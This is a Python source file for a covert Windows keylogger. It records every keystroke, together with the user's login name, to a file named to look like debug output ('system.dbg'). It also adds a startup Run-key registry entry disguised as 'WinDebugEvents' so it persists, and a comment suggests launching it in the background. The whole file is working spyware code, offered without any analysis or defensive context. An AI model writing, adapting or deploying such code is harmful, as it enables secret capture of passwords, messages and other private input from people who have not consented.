from pynput.keyboard import Key, Listener
from os import getlogin
import logging, winreg
from sys import exit

#invoke = start /b %%%%%

save_file = "system.dbg"
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def query_reg(name):
    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_READ)
    try:
        value, regtype = winreg.QueryValueEx(registry_key, name)
        winreg.CloseKey(registry_key)
        return True
    except:
        return False

try:
    if not query_reg("WinDebugEvents"):
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "WinDebugEvents", 0, winreg.REG_SZ, "C:\\Windows\\system\\")
        winreg.CloseKey(registry_key)
    else:
        pass

except:
    pass

try:
    #logging.basicConfig(filename = (save_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    #logging.basicConfig(handlers=logging.FileHandler(filename=save_file, encoding='utf-8'), filemode="a+", format="%(asctime)s: %(message)s", level=logging.DEBUG)
    root_logger= logging.getLogger()
    root_logger.setLevel(logging.DEBUG)
    handler = logging.FileHandler(save_file, 'a+', 'utf-8')
    handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
    root_logger.addHandler(handler)

except:
    pass

def on_press(key):
   logging.info("[{}]: {}".format(getlogin(), str(key)))

with Listener(on_press=on_press) as listener:
    listener.join()    